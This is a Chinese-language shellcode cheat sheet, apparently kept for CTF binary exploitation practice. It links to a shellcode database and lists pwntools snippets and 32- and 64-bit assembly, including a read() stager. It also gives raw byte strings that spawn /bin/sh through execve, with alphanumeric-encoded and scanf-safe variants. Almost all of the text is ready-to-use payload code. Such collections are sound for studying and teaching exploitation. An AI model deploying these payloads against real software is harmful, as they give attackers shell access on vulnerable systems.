

**shellcode数据库**：[Shellcodes database for study cases (shell-storm.org)](http://www.shell-storm.org/shellcode/index.html)



## 常用shellcode

最好直接用21Bytes和23Bytes的。

### pwntools

```
context(xxx="xxx")

payload = asm(shellcraft.sh())
```



### 32位

```python
shellcode = asm('''push eax
                    pop ebx 
                    push edx
                    pop eax
                    dec eax
                    xor al,0x46
                    xor byte ptr[ebx+0x35],al #set int 0x80
                    xor byte ptr[ebx+0x36],al
                    push ecx 
                    pop eax
                    xor al, 0x41
                    xor al, 0x40
                    push ecx
                    pop eax
                    xor al, 0x41
                    xor al, 0x40
                    push ecx
                    pop eax
                    xor al, 0x41
                    xor al, 0x40
                    push ecx # set al=0xb
                    pop eax
                    xor al, 0x41
                    xor al, 0x40
                    push edx  # set ecx=0
                    pop ecx
                    push 0x68 # push /bin/sh
                    push 0x732f2f2f
                    push 0x6e69622f
                    push esp
                    pop ebx''') 
```

**21Bytes**:

```
b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
```

**ascii**:

```
'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'
```

**for scanf**:

```
'\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh'
```



### 64位

```python
# read(0,0xcafe0000,0x1000)
shellcode = asm("""
    xor eax, eax /* SYS_read */
    xor edi, edi /* 0 */
    mov edx, 0x1000
    mov esi, 0xcafe0000
    syscall
""")
```



**23Bytes**

```
"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```



```
'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
```



**ascii**

```
"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
```



**for scanf**

```
'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```



